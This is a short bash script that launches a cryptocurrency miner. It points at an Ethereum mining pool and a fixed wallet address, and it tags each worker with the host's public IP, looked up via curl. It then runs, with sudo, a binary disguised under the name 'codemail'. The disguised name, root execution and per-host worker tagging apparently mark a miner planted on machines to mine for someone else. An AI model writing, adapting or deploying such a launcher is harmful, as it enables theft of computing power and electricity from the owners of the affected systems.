#!/bin/bash

POOL=us-eth.2miners.com:2020
WALLET=0xcea9909d28ff9b03aab80f5bad053c7b96671fb2.$(echo "$(curl -s ifconfig.me)" | tr . _ )-maume-

cd "$(dirname "$0")"

chmod +x ./codemail && sudo ./codemail --algo ETHASH --pool $POOL --user $WALLET  $@
